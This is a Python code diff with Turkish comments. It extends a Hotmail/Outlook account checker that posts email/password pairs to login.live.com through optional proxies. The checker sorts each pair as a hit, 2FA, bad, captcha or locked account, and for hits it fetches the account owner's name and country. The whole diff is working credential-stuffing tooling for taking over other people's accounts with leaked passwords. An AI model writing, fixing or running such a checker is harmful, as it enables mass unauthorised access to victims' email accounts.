@@ -3486,59 +3486,178 @@ def _extract_login_params(session, email):
     except Exception as e:
         return {"success": False, "error": str(e)}
 
+def _check_hotmail_simple(email, password, proxy=None):
+    """Basit login.live.com post (berofc imzaları) — OAuth başarısız olursa yedek."""
+    try:
+        session = requests.Session()
+        session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "*/*",
+            "Host": "login.live.com",
+            "Pragma": "no-cache",
+        })
+        if proxy:
+            session.proxies = {"http": proxy, "https": proxy}
+        # Canlı PPFT al
+        auth = session.get(
+            "https://login.live.com/oauth20_authorize.srf",
+            params={
+                "client_id": "0000000040170455",
+                "response_type": "token",
+                "scope": "service::ssl.live.com::MBI_SSL",
+                "redirect_uri": "https://login.live.com/oauth20_desktop.srf",
+                "login_hint": email,
+            },
+            timeout=15,
+        )
+        ppft_m = re.search(r'name="PPFT"[^>]*value="([^"]+)"', auth.text)
+        ppft = ppft_m.group(1) if ppft_m else ""
+        url_post_m = re.search(r'urlPost["\']?\s*[:=]\s*["\']([^"\']+)', auth.text)
+        url_post = url_post_m.group(1) if url_post_m else "https://login.live.com/ppsecure/post.srf"
+        data = {
+            "i13": "0", "login": email, "loginfmt": email, "type": "11",
+            "LoginOptions": "3", "passwd": password, "ps": "2",
+            "PPFT": ppft, "PPSX": "Pa", "NewUser": "1", "fspost": "0",
+            "CookieDisclosure": "0", "IsFidoSupported": "0",
+            "isSignupPost": "0", "isRecoveryAttemptPost": "0", "i19": "12498",
+        }
+        resp = session.post(url_post, data=data, timeout=15, allow_redirects=True)
+        text = resp.text or ""
+        loc = resp.url or ""
+        # HIT imzaları
+        if any(x in loc for x in ("access_token", "code=", "oauth20_desktop")) or \
+           any(x in text for x in ("access_token", "ANON", "WLSSC")):
+            return {"status": "hit", "email": email, "password": password,
+                    "name": "Bilinmiyor", "country": "Bilinmiyor", "detail": "Login OK (simple)"}
+        # 2FA / Factor
+        if 'name="ipt" id="ipt"' in text or any(x in text.lower() for x in (
+            "two-step", "2fa", "authenticator", "security code", "proofup", "mfa",
+            "verify your identity", "additional security", "enter code", "send code"
+        )):
+            return {"status": "2fa", "email": email, "password": password, "detail": "2FA / Factor"}
+        # BAD
+        if "Type = {SQSA: 6, CSS: 5," in text or any(x in text.lower() for x in (
+            "incorrect password", "wrong password", "doesn't exist", "invalid password",
+            "that password is incorrect", "we couldn't find", "account not found",
+            "doesn't look right", "password is incorrect"
+        )):
+            return {"status": "bad", "email": email, "password": password, "detail": "Invalid credentials"}
+        if "sSigninName" in text:
+            return {"status": "bad", "email": email, "password": password, "detail": "Still on login form"}
+        return {"status": "error", "email": email, "password": password, "detail": "Unknown (simple)"}
+    except Exception as e:
+        return {"status": "error", "detail": str(e)}
+
+
 def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
     for attempt in range(max_retries):
         session = _get_login_session(proxy)
         try:
             params = _extract_login_params(session, email)
             if not params["success"]:
-                if attempt < max_retries - 1: time.sleep(1); continue
-                return {"status":"error","detail":params.get("error","Param extraction failed")}
-            ppft = params["ppft"]; url_post = params["url_post"]; cookies = params["cookies"]
-            login_data = {"login":email,"loginfmt":email,"type":"11","LoginOptions":"3",
-                          "passwd":password,"KMSI":"1","NewUser":"1","PPFT":ppft,"PPSX":"Pa",
-                          "i13":"0","ps":"2","fspost":"0","CookieDisclosure":"0",
-                          "IsFidoSupported":"1","isSignupPost":"0","isRecoveryAttemptPost":"0","i19":"0"}
+                # OAuth param alınamadı → basit yöntem dene
+                simple = _check_hotmail_simple(email, password, proxy)
+                if simple.get("status") in ("hit", "2fa", "bad"):
+                    return simple
+                if attempt < max_retries - 1:
+                    time.sleep(1)
+                    continue
+                return {"status": "error", "detail": params.get("error", "Param extraction failed")}
+            ppft = params["ppft"]
+            url_post = params["url_post"]
+            cookies = params["cookies"]
+            login_data = {
+                "login": email, "loginfmt": email, "type": "11", "LoginOptions": "3",
+                "passwd": password, "KMSI": "1", "NewUser": "1", "PPFT": ppft, "PPSX": "Pa",
+                "i13": "0", "ps": "2", "fspost": "0", "CookieDisclosure": "0",
+                "IsFidoSupported": "1", "isSignupPost": "0", "isRecoveryAttemptPost": "0", "i19": "0",
+            }
             cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
-            headers = {"Content-Type":"application/x-www-form-urlencoded","Origin":"https://login.live.com",
-                       "Referer":"https://login.live.com/","Cookie":cookie_str}
+            headers = {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": "https://login.live.com",
+                "Referer": "https://login.live.com/",
+                "Cookie": cookie_str,
+            }
             resp = session.post(url_post, data=login_data, headers=headers, timeout=20, allow_redirects=False)
-            text = resp.text; headers_resp = resp.headers
-            status_code = resp.status_code; location = headers_resp.get('Location','')
-            if 'code=' in location or 'access_token' in location:
+            text = resp.text or ""
+            headers_resp = resp.headers
+            status_code = resp.status_code
+            location = headers_resp.get("Location", "") or ""
+
+            # HIT — redirect / token
+            if "code=" in location or "access_token" in location:
                 token_info = _get_access_token_from_redirect(session, location)
                 account_info = _get_account_info(token_info.get("token")) if token_info.get("token") else {}
-                return {"status":"hit","email":email,"password":password,
-                        "name":account_info.get("name","Bilinmiyor"),
-                        "country":account_info.get("country","Bilinmiyor"),
-                        "detail":"Login successful"}
-            if any(x in text.lower() for x in ["two-step","2fa","authenticator","security code",
-                "verify your identity","additional security","microsoft authenticator","enter code",
-                "send code","proofup","mfa","two factor"]) or "proofup" in location.lower():
-                return {"status":"2fa","email":email,"password":password,"detail":"2FA enabled"}
-            if any(x in text.lower() for x in ["incorrect password","wrong password","doesn't exist",
-                "account doesn't exist","invalid password","sign in error","that password is incorrect",
-                "we couldn't find","account not found","doesn't look right","password is incorrect",
-                "login failed"]) or status_code == 200 and "sSigninName" not in text:
-                return {"status":"bad","email":email,"password":password,"detail":"Invalid credentials"}
-            if any(x in text.lower() for x in ["captcha","recaptcha","challenge","verify you're human",
-                "i'm not a robot","g-recaptcha"]):
-                return {"status":"captcha","email":email,"password":password,"detail":"Captcha required"}
-            if any(x in text.lower() for x in ["locked","suspended","blocked","temporarily locked",
-                "unusual activity","security alert","account restricted"]):
-                return {"status":"locked","email":email,"password":password,"detail":"Account locked"}
-            return {"status":"error","email":email,"password":password,
-                    "detail":f"Unknown response (status={status_code})","sample":text[:200]}
+                return {
+                    "status": "hit", "email": email, "password": password,
+                    "name": account_info.get("name", "Bilinmiyor"),
+                    "country": account_info.get("country", "Bilinmiyor"),
+                    "detail": "Login successful",
+                }
+
+            # 2FA — klasik + ipt alanı (berofc imzası)
+            if 'name="ipt" id="ipt"' in text or "proofup" in location.lower() or any(
+                x in text.lower() for x in (
+                    "two-step", "2fa", "authenticator", "security code",
+                    "verify your identity", "additional security", "microsoft authenticator",
+                    "enter code", "send code", "proofup", "mfa", "two factor",
+                )
+            ):
+                return {"status": "2fa", "email": email, "password": password, "detail": "2FA enabled"}
+
+            # BAD — SQSA + metin imzaları
+            if "Type = {SQSA: 6, CSS: 5," in text or any(
+                x in text.lower() for x in (
+                    "incorrect password", "wrong password", "doesn't exist",
+                    "account doesn't exist", "invalid password", "sign in error",
+                    "that password is incorrect", "we couldn't find", "account not found",
+                    "doesn't look right", "password is incorrect", "login failed",
+                )
+            ):
+                return {"status": "bad", "email": email, "password": password, "detail": "Invalid credentials"}
+
+            # Hâlâ login formu
+            if "sSigninName" in text and status_code == 200:
+                return {"status": "bad", "email": email, "password": password, "detail": "Invalid credentials"}
+
+            if any(x in text.lower() for x in (
+                "captcha", "recaptcha", "challenge", "verify you're human",
+                "i'm not a robot", "g-recaptcha",
+            )):
+                return {"status": "captcha", "email": email, "password": password, "detail": "Captcha required"}
+
+            if any(x in text.lower() for x in (
+                "locked", "suspended", "blocked", "temporarily locked",
+                "unusual activity", "security alert", "account restricted",
+            )):
+                return {"status": "locked", "email": email, "password": password, "detail": "Account locked"}
+
+            # Bilinmeyen → basit yöntem dene
+            simple = _check_hotmail_simple(email, password, proxy)
+            if simple.get("status") in ("hit", "2fa", "bad"):
+                return simple
+            return {
+                "status": "error", "email": email, "password": password,
+                "detail": f"Unknown response (status={status_code})", "sample": text[:200],
+            }
         except requests.exceptions.ProxyError as e:
-            if attempt < max_retries - 1: time.sleep(1); continue
-            return {"status":"error","detail":f"Proxy error: {str(e)}"}
+            if attempt < max_retries - 1:
+                time.sleep(1)
+                continue
+            return {"status": "error", "detail": f"Proxy error: {str(e)}"}
         except requests.exceptions.Timeout:
-            if attempt < max_retries - 1: time.sleep(2); continue
-            return {"status":"error","detail":"Timeout"}
+            if attempt < max_retries - 1:
+                time.sleep(2)
+                continue
+            return {"status": "error", "detail": "Timeout"}
         except Exception as e:
-            if attempt < max_retries - 1: time.sleep(1); continue
-            return {"status":"error","detail":str(e)}
-        finally: session.close()
+            if attempt < max_retries - 1:
+                time.sleep(1)
+                continue
+            return {"status": "error", "detail": str(e)}
+        finally:
+            session.close()
 
 def _get_access_token_from_redirect(session, location):
     try:
